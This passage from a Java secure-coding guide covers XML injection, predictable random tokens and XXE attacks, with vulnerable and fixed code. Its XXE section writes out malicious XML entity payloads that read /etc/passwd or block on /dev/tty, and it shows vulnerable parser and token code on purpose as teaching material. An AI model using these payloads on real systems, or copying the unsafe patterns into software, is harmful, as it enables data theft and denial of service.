                <h1 id="PE1099">XML Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The extensible markup language (XML) is designed to help store, structure, and transfer data. Because of its platform independence, flexibility, and relative simplicity, XML has found use in a wide range of applications. However, because of its versatility, XML is vulnerable to a wide spectrum of attacks, including XML injection.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>A user who has the ability to provide input string data that is incorporated into an XML document can inject XML tags. These tags are interpreted by the XML parser and may cause data to be overridden.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
</li>
<li>
<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules.</p>
</li>
<li>
<p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist).</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>In this vulnerable code example, a client method uses simple string concatenation to build an XML query to send to a server. XML injection is possible because the method performs no input validation.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStreamBad</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">quantity</span>
        <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>Depending on the specific data and command interpreter or parser to which data is being sent, appropriate methods must be used to sanitize untrusted user input. This compliant solution validates that quantity is an unsigned integer:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStream</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">NumberFormatException</span> <span class="o">{</span>
    <span class="c1">// Write XML string only if quantity is an unsigned integer (count).</span>
    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseUnsignedInt</span><span class="o">(</span><span class="n">quantity</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">count</span> <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>A more general mechanism for checking XML for attempted injection is to validate it using a Document Type Definition (DTD) or schema. The schema must be rigidly defined to prevent injections from being mistaken for valid XML. Here is a suitable schema for validating our XML snippet:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
<span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"item"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
    <span class="nt">&lt;xs:sequence&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">type=</span><span class="s">"xs:string"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"price"</span> <span class="na">type=</span><span class="s">"xs:decimal"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"quantity"</span> <span class="na">type=</span><span class="s">"xs:nonNegativeInteger"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/xs:sequence&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</pre></div>
</td></tr></table>
<p>Using a schema or DTD to validate XML is convenient when receiving XML that may have been loaded with unsanitized input. If such an XML string has not yet been built, sanitizing input before constructing XML yields better performance.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.StringReader</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.XMLConstants</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.transform.stream.StreamSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.validation.Schema</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.validation.SchemaFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXParseException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.XMLReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">OnlineStore</span> <span class="o">{</span>

  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">createXMLStream</span><span class="o">(</span><span class="kd">final</span> <span class="n">BufferedOutputStream</span> <span class="n">outStream</span><span class="o">,</span>
      <span class="kd">final</span> <span class="n">String</span> <span class="n">quantity</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">xmlString</span><span class="o">;</span>
    <span class="n">xmlString</span> <span class="o">=</span> <span class="s">"&lt;item&gt;\n&lt;description&gt;Widget&lt;/description&gt;\n"</span>
        <span class="o">+</span> <span class="s">"&lt;price&gt;500.0&lt;/price&gt;\n"</span> <span class="o">+</span> <span class="s">"&lt;quantity&gt;"</span> <span class="o">+</span> <span class="n">quantity</span>
        <span class="o">+</span> <span class="s">"&lt;/quantity&gt;&lt;/item&gt;"</span><span class="o">;</span>
    <span class="n">InputSource</span> <span class="n">xmlStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xmlString</span><span class="o">));</span>
    <span class="c1">// Build a validating SAX parser using our schema</span>
    <span class="n">SchemaFactory</span> <span class="n">sf</span> <span class="o">=</span> <span class="n">SchemaFactory</span>
        <span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">XMLConstants</span><span class="o">.</span><span class="na">W3C_XML_SCHEMA_NS_URI</span><span class="o">);</span>
    <span class="n">DefaultHandler</span> <span class="n">defHandler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">()</span> <span class="o">{</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">warning</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">error</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">fatalError</span><span class="o">(</span><span class="n">SAXParseException</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SAXParseException</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="n">s</span><span class="o">;</span>
      <span class="o">}</span>
    <span class="o">};</span>
    <span class="n">StreamSource</span> <span class="n">ss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StreamSource</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"schema.xsd"</span><span class="o">));</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">Schema</span> <span class="n">schema</span> <span class="o">=</span> <span class="n">sf</span><span class="o">.</span><span class="na">newSchema</span><span class="o">(</span><span class="n">ss</span><span class="o">);</span>
      <span class="n">SAXParserFactory</span> <span class="n">spf</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
      <span class="n">spf</span><span class="o">.</span><span class="na">setSchema</span><span class="o">(</span><span class="n">schema</span><span class="o">);</span>
      <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">spf</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>
      <span class="c1">// To set the custom entity resolver,</span>
      <span class="c1">// an XML reader needs to be created</span>
      <span class="n">XMLReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">saxParser</span><span class="o">.</span><span class="na">getXMLReader</span><span class="o">();</span>
      <span class="n">reader</span><span class="o">.</span><span class="na">setEntityResolver</span><span class="o">(</span><span class="k">new</span> <span class="n">CustomResolver</span><span class="o">());</span>
      <span class="n">saxParser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">xmlStream</span><span class="o">,</span> <span class="n">defHandler</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ParserConfigurationException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">IOException</span><span class="o">(</span><span class="s">"Unable to validate XML"</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SAXException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">IOException</span><span class="o">(</span><span class="s">"Invalid quantity"</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="c1">// Our XML is valid, proceed</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">xmlString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="n">outStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS16-J.+Prevent+XML+Injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7478">Predictable pseudorandom number generator</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Predictable pseudorandom number generator</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The use of a predictable random value can lead to vulnerabilities when used in certain security critical contexts. For example, when the value is used as:</p>
<ul>
<li>a CSRF token: a predictable token can lead to a CSRF attack as an attacker will know the value of the token</li>
<li>a password reset token (sent by email): a predictable password token can lead to an account takeover, since an attacker will guess the URL of the change password form</li>
<li>any other secret value</li>
</ul>
<p>
A quick fix could be to replace the use of <b>java.util.Random</b> with something stronger, such as <b>java.security.SecureRandom</b>.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>String generateSecretToken() {
    Random r = new Random();
    return Long.toHexString(r.nextLong());
}</pre>
</p>
<p>
<b>Solution:</b>
<pre>import org.apache.commons.codec.binary.Hex;
String generateSecretToken() {
    SecureRandom secRandom = new SecureRandom();
    byte[] result = new byte[32];
    secRandom.nextBytes(result);
    return Hex.encodeHexString(result);
}</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://jazzy.id.au/default/2010/09/20/cracking_random_number_generators_part_1.html">Cracking Random Number Generators - Part 1 (http://jazzy.id.au)</a><br/>
<a href="https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers">CERT: MSC02-J. Generate strong random numbers</a><br/>
<a href="http://cwe.mitre.org/data/definitions/330.html">CWE-330: Use of Insufficiently Random Values</a><br/>
<a href="http://blog.h3xstream.com/2014/12/predicting-struts-csrf-token-cve-2014.html">Predicting Struts CSRF Token (Example of real-life vulnerability and exploitation)</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0090">XML External Entity Attacks</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example-1-checking-if-the-external-entity-is-safe-before-usage">Fixed code Example 1 : checking if the external entity is safe before usage</a></li>
<li><a href="#fixed-code-example-2-forbidding-the-use-of-external-entity">Fixed code Example 2 : forbidding the use of external entity</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.</p>
<p>By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as "file:///c:/winnt/win.ini" designates (in Windows) the file C:\Winnt\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.</p>
<p>Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>An XML external entity (XXE) attack occurs when XML input containing a reference to an external entity is processed by an improperly configured XML parser leading to problems such as the leaking of sensitive data or the crashing of the system.</p>
<p>An attacker might use an XXE attack to gain access to sensitive information by manipulating the URI of the entity to refer to files on the local file system containing sensitive data such as passwords and private user data. </p>
<p>An attacker might launch a denial-of-service attack, for example, by specifying /dev/random or /dev/tty as input URIs, which can crash or indefinitely block a program.</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Many XML parsers and validators can be configured to disable external entity expansion. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>This noncompliant code example attempts to parse the file evil.xml, report any errors, and exit. However, a malformed XML file may contain evil entity, leading to the vulnerability of the whole system.  </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">XXE</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">receiveXMLStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inStream</span><span class="o">,</span>
                                       <span class="n">DefaultHandler</span> <span class="n">defaultHandler</span><span class="o">)</span>
      <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">SAXParserFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>
    <span class="n">saxParser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">inStream</span><span class="o">,</span> <span class="n">defaultHandler</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span>
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">receiveXMLStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"evil.xml"</span><span class="o">),</span> 
      <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">MalformedURLException</span> <span class="n">mue</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Malformed URL Exception: "</span> <span class="o">+</span> <span class="n">mue</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>This program is subject to a remote XXE attack if the evil.xml file contains the following:</p>
<p>(1) A SAX (Simple API for XML) or a DOM (Document Object Model) parser will attempt to access the URI specified by the SYSTEM attribute, which means it will attempt to read the contents of the local /dev/tty file. On POSIX systems, reading this file causes the program to block until input data is supplied to the machine's console. Consequently, an attacker can use this malicious XML file to cause the program to hang.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo SYSTEM "file:/dev/tty"&gt;</span>
<span class="nt">&lt;foo&gt;</span>bar<span class="nt">&lt;/foo&gt;</span>
</pre></div>
</td></tr></table>
<p>(2) A SAX (Simple API for XML) or a DOM (Document Object Model) parser will attempt to access system password file(/etc/passwd), leading to leaking of sensitive data.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">&lt;</span>?xml version="1.0" encoiding="utf-8"&gt;
<span class="cp">&lt;!DOCTYPE hack [</span>
<span class="cp">    &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span>
   %name; 
]&gt;
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-1-checking-if-the-external-entity-is-safe-before-usage">Fixed code Example 1 : checking if the external entity is safe before usage</h3>
<p>This compliant solution defines a CustomResolver class that implements the interface org.xml.sax.EntityResolver. This interface enables a SAX application to customize handling of external entities. It is OK to customize a simple function judging if the entity path is safe and if the entity path is safe, it can be parsed while the resolveEntity() method returns an empty InputSource when an input fails to resolve to any of the specified, safe entity source paths.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.EntityResolver</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">CustomResolver</span> <span class="kd">implements</span> <span class="n">EntityResolver</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="n">InputSource</span> <span class="nf">resolveEntity</span><span class="o">(</span><span class="n">String</span> <span class="n">publicId</span><span class="o">,</span> <span class="n">String</span> <span class="n">systemId</span><span class="o">)</span>
      <span class="kd">throws</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>

    <span class="c1">// Check for known good entities</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">isSafe</span><span class="o">(</span><span class="n">publicId</span><span class="o">,</span> <span class="n">systemId</span><span class="o">))</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Resolving entity: "</span> <span class="o">+</span> <span class="n">publicId</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="n">systemId</span><span class="o">);</span>
      <span class="k">return</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="n">entityPath</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
      <span class="c1">// Disallow unknown entities by returning a blank path</span>
      <span class="k">return</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">();</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>The setEntityResolver() method registers the instance with the corresponding SAX driver. When parsing malicious input, the empty InputSource returned by the custom resolver causes a java.net.MalformedURLException to be thrown. Note that you must create an XMLReader object on which to set the custom entity resolver.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.XMLReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">XXE</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">receiveXMLStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inStream</span><span class="o">,</span>
      <span class="n">DefaultHandler</span> <span class="n">defaultHandler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span>
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">SAXParserFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
